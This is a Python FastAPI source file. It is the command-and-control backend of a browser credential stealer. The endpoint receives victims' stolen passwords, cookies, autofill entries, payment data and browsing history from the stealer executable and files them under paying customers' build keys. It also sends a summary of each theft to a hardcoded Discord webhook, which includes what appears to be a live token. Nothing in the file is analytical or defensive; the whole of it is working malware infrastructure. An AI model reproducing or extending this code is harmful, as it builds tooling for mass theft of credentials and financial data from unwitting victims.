"""
Browser Stealer Data Endpoint
Receives browser credentials from the browser_stealer executable
"""

from fastapi import APIRouter, HTTPException, Request
from sqlalchemy.orm import Session
from app.core.database import get_db
from app.models import Log, User
from fastapi import Depends
import json
import logging
from datetime import datetime

router = APIRouter()
log = logging.getLogger(__name__)

# Discord webhook for admin notifications
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1321998028282703995/L0XCKHfvBGfD3wl5WvGnWNJg1wZ22xHJTh1J4iiNqDsjDNNL-W5KxXGE1PFRzg2m9YZD"

@router.post("/browser")
async def receive_browser_data(
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive browser stealer data from executable.
    Build key is passed via X-Build-Key header.
    """
    try:
        # Get build key from header
        build_key = request.headers.get("X-Build-Key", "")
        if not build_key:
            raise HTTPException(status_code=401, detail="Missing build key")
        
        # Find user by build key
        user = db.query(User).filter(User.build_key == build_key).first()
        
        # Get request body
        body = await request.json()
        
        pc_name = body.get("pc_name", "Unknown")
        pc_user = body.get("pc_user", "Unknown")
        browser = body.get("browser", "Unknown")
        summary = body.get("summary", {})
        data = body.get("data", {})
        
        # Build log content
        log_content = json.dumps({
            "pc_name": pc_name,
            "pc_user": pc_user,
            "browser": browser,
            "summary": summary,
            "data": data,
            "received_at": datetime.utcnow().isoformat()
        })
        
        # Get client IP
        client_ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "Unknown")
        if "," in client_ip:
            client_ip = client_ip.split(",")[0].strip()
        
        # Store as log entry
        log_entry = Log(
            user_id=user.id if user else None,
            log_type="browser",
            content=log_content,
            ip_address=client_ip,
            pc_name=pc_name,
            pc_user=pc_user
        )
        db.add(log_entry)
        db.commit()
        
        # Send Discord embed notification
        try:
            import aiohttp
            
            cookies = summary.get("cookies", 0)
            passwords = summary.get("passwords", 0)
            autofills = summary.get("autofills", 0)
            payments = summary.get("payments", 0)
            history = summary.get("history", 0)
            
            embed = {
                "title": f"🌐 Browser Steal - {browser}",
                "color": 0x3498db,
                "fields": [
                    {"name": "📍 PC Name", "value": f"`{pc_name}`", "inline": True},
                    {"name": "👤 PC User", "value": f"`{pc_user}`", "inline": True},
                    {"name": "🌐 Browser", "value": f"`{browser}`", "inline": True},
                    {"name": "🍪 Cookies", "value": f"`{cookies}`", "inline": True},
                    {"name": "🔑 Passwords", "value": f"`{passwords}`", "inline": True},
                    {"name": "📝 Autofills", "value": f"`{autofills}`", "inline": True},
                    {"name": "💳 Payments", "value": f"`{payments}`", "inline": True},
                    {"name": "📜 History", "value": f"`{history}`", "inline": True},
                    {"name": "🌐 IP", "value": f"`{client_ip}`", "inline": True},
                ],
                "footer": {"text": f"User: {user.username if user else 'Admin'}"},
                "timestamp": datetime.utcnow().isoformat()
            }
            
            async with aiohttp.ClientSession() as session:
                await session.post(DISCORD_WEBHOOK, json={"embeds": [embed]})
        except Exception as e:
            log.warning(f"Failed to send Discord webhook: {e}")
        
        return {"success": True, "message": "Data received"}
        
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    except Exception as e:
        log.error(f"Error receiving browser data: {e}")
        raise HTTPException(status_code=500, detail=str(e))
